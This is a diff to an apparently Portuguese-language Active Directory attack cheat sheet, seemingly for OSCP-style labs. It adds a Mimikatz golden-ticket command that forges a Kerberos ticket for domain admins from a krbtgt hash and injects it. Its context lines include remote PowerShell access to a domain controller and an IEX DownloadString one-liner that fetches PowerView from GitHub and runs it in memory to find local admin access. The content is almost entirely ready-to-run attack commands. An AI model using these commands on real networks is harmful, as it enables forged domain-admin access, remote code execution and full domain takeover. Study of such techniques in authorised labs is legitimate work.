@@ -1377,7 +1377,11 @@ OPÇÃO 3 - ACESSAR REMOTAMENTE VIA PSREMOTE
 ```
 Enter-Pssession -computername tech-dc01
 ```
-OPÇÃO 4 - VERIFICAR ONDE SOU ADMINISTRADOR LOCAL
+OPÇÃO 4 - CRIAR GOLDEN TICKETS
+```
+kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
+```
+OPÇÃO 5 - VERIFICAR ONDE SOU ADMINISTRADOR LOCAL
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
 FIND-LOCALADMINACCESS
